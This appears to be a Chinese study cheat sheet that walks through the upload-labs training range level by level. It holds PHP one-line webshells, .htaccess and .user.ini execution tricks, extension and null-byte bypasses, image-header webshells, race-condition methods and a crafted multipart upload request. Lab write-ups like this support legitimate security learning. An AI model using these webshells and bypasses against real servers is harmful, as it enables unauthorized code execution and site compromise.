# upload-lebs纯文本速查

推荐用phpstudy2016版搭建靶场，可以复原所有环境。
工具：==burpsuite==、==中国蚁剑==（或哥斯拉）

## Pass-1(JS限制)

```php
<?php @eval($_POST['pass']); ?>
```

关JavaScript，或删掉限制条件。

## Pass-2(MIME限制)

MIME检查会在==POSE请求之后==进行，所以可以用burpsuite进行改包。

*注意：*把POST下方传入的文件的==Content-Type==改成imge/jpeg、image/png、image/gif这种典型的白名单。

## Pass-3(其他文件名)

改后缀名.php3、.php5、phtml、pht、phar、pHp等

## Pass-4(.htaccess[^④])

.htaccess管Apache的规则。（扔里整个文件夹就会被运行）

```apache
AddType application/x-httpd-php .txt
```

然后连接文件路径至文件名。（不要带.php）

## Pass-5(.user.ini[^⑤])

.user.ini管PHP的配置。（扔里整个文件夹就会被运行）

```ini
auto_prepend_file=shell.jpg
```

然后连接文件路径至文件名。（不要带.php）

## Pass-6(大小写)

文件名改成 `shell.Php` 或 `shell.pHP` 或 `shell.Php5`或`.pHtml`

## Pass-7(加` `)

上传`.php `，连接`.php`

*Linux 保存文件会保留空格。空格绕过主要针对 Windows 服务器。*

## Pass-8(加`.`)

上传`.php.`，连接`.php`

*Linux 仍然不生效，保存文件会保留`.`。*

## Pass-9(加`::$DATA`[^⑥])

上传`.php::$DATA`，连接`.php`

*Linux 和 macOS 不支持 `::$DATA` 语法，与PHP版本无关*

## Pass-10(加`. .`)

上传`.php. .`，连接`.php`

*Linux 仍然不生效。*

## Pass-11(双写)

上传`.pphphp`，连接`.php`

## Pass-12(截断GAT型)

抓包，将文件名改成shell.png，将save_path的传参改成../upload/shell.php%00（GAT检查）

## Pass-13(截断POST型)

需要在Hex(16进制文件)中修改shell.php后的空格，否则空格无效。

将文件名改成shell.png，将save_path的传参改成../upload/shell.php （POST检查）

## Pass-14、Pass-15、Pass-16(文件头标识)

就是上传**图片马**，骗过 `getimagesize()` 等函数，再配合文件包含漏洞执行代码。

**常见图片文件头**

| 图片格式 | 文件头（十六进制） | 文件头（ASCII/文本）  |
| :------- | :----------------- | :-------------------- |
| JPEG     | `FF D8 FF E0`      | 乱码，但开头是 `ÿØÿà` |
| PNG      | `89 50 4E 47`      | `.PNG`                |
| GIF      | `47 49 46 38`      | `GIF8`                |
| BMP      | `42 4D`            | `BM`                  |

用010 Editor修改文件头，或者最直接的就是在php代码前面加上`GIF89a`然后另起一行。

```php
GIF89a
<?php @eval($_POST['pass']); ?>
```

上传后发现是`gif`以图片的形式上传的。访问这个图片。（后面的是文件包含的操作）

图片马不会自己执行，需要被文件包含执行。

```txt
http://127.0.0.1/upload/include.php?file=upload/1120260319071146.gif
```

连接用这个路径就能get shell了。

**核心原因**：Web服务器根据**后缀名**决定如何解析文件

- **自己找**：扫描目录、分析代码
- **自己造**：上传 `.htaccess` 或 `.user.ini` 让服务器自动包含

| 对比     | 第14关           | 第15关       | 第16关             |
| :------- | :--------------- | ------------ | :----------------- |
| 检测函数 | `getimagesize()` | `isImage()`  | `exif_imagetype()` |
| 返回值   | 数组或false      | 数组或false  | 常量或false        |
| 绕过方式 | 图片马           | 图片马       | 图片马             |
| 后续利用 | 需要文件包含     | 需要文件包含 | 需要文件包含       |

## Pass-17(二次渲染)

手工方法：

1. 上传一个普通GIF
2. 下载二次渲染后的GIF
3. 对比原图和渲染图的**差异**
4. 找到**没有被修改的区块**（如图形数据区）
5. 把PHP代码插在那里
6. 上传修改后的GIF

## Pass-18(条件竞争)

**条件竞争**针对的是 **「文件落地了，但还没被处理掉」** 的那一瞬间。只要存在这个时间窗口，就有可能用并发挤进去执行代码。

==*先上传保存，再检测删除*==          *==先上传保存，再重命名==*          *==先上传保存，再改内容==*          *==文件锁竞争[^⑦]==*          *==缓存/CDN 同步延迟[^⑧]==*          *==日志文件竞争[^⑨]==*          *==`Session`文件竞争[^⑩]==*

(Python代码问ai)

## Pass-19

### 思路一：Apache解析漏洞 + 条件竞争

**原理**：

- Apache解析文件时，从最右边的后缀开始识别，遇到不认识的就往左移
- 如果上传 `shell.php.7z`，Apache先看 `.7z`（不认识）→ 再看 `.php`（认识，用PHP解析）
- 但问题是，服务器会用时间戳重命名文件，所以上传的 `shell.php.7z` 可能被改成 `12345.7z`，失去了 `.php` 后缀

**关键点**：代码是先移动文件，再重命名文件。在移动完成→重命名完成之间，存在一个**时间窗口**。如果在这个窗口期内访问到文件（此时文件名还是你上传的原始文件名），就能触发Apache解析漏洞。

**操作步骤**：

1. 准备一个PHP木马文件，改名为 `shell.php.7z`（或其他白名单里且Apache不认识的扩展名，如 `.7z`）
2. 用Python脚本干扰。
3. 用Burp Intruder的Intruder不停访问 `/upload/shell.php.7z`
4. 一旦在重命名前访问到，PHP代码被执行

### 思路二：图片马 + 文件包含

**原理**：

- 虽然代码会检查扩展名（在白名单内才能上传），但**不检查文件内容**
- 上传成功后，页面会回显图片路径
- 如果网站存在文件包含漏洞，可以用包含的方式执行图片马中的PHP代码

**操作步骤**：

1. 制作图片马：在一张正常图片末尾追加PHP代码，或者直接构造GIF89a头的木马
2. 上传这个图片马，保存为 `.jpg` 或 `.gif`（白名单允许）
3. 获取上传后的图片路径（页面会显示）
4. 如果存在文件包含点，通过文件包含访问该图片，执行其中的PHP代码

### 思路三：利用Windows重命名竞争 + 原文件残留

这个思路来自Windows环境下的一个特性。

**原理**：

- 代码使用 `time()` 生成新文件名，只精确到秒
- 如果在一秒内上传多个文件，重命名时会发生冲突，导致**部分文件重命名失败**，但原始文件依然保留在服务器上
- 这些保留的原始文件名（如 `shell.php.7z`）如果未被重命名，就能被直接访问

**操作步骤**：

1. 用Burp Intruder高速并发上传同一文件（每秒几十上百次）
2. 由于重命名冲突，部分文件未被重命名，保留了原始文件名
3. 访问这些原始文件名的文件（需配合Apache解析漏洞）

## Pass-20(特殊符号)

windows下构造`php\.`,linux构造`php/.`

## Pass-21(数组后缀绕过)

如下图用burpsuite改动上传的文件数组。

```http
......
------geckoformboundarvc1823aeebf5db4fa9c273c15c84c5143
Content-Disposition: form-data; name="upload_file"; filename="aaa. jpg"
Content-Type: image/jpeg

<?php@eval ($_POST['cmd']);?>
------geckoformboundaryc1823aeebf5db4fa9c273c15c84c5143
Content-Disposition: form-data; name="save_name[0]"

aaa.php
------geckoformboundarvc1823aeebf5db4fa9c273c15c84c5143
Content-Disposition: form-data; name="save_name[2]"

jpg
------geckoformboundaryc1823aeebf5db4fa9c273c15c84c5143
Content-Disposition: form-data; name="submit"
```



[^④]: 监听80/443端口，把浏览器发来的HTTP请求传给对应的服务器，再把结果成HTTP的响应返回。
[^⑤]: 把.php文件里的HTML+PHP代码逐行执行，生成纯HTML（或JSON、图片等）。
[^⑥]: 在 Windows 系统中，`::$DATA` 是 NTFS 文件系统中的一种**数据流标识**，用于访问文件的**主要数据流**。
[^⑦]: 多线程同时上传同名文件时，可能一个线程在写，另一个线程在读，读到不完整的内容，但能触发代码执行。
[^⑧]: 文件保存到本地后，同步到 CDN 或备份服务器之前，如果先被访问到，可能绕过一些检查。
[^⑨]: 如果日志文件中能写入 PHP 代码，在日志被写入后、被清理前，如果能包含进来，也能形成竞争。（写日志时包含用户输入）
[^⑩]: 如果 Session 文件中能写入用户控制的代码，在 Session 写入后、被覆盖前，如果能包含进来，也能利用。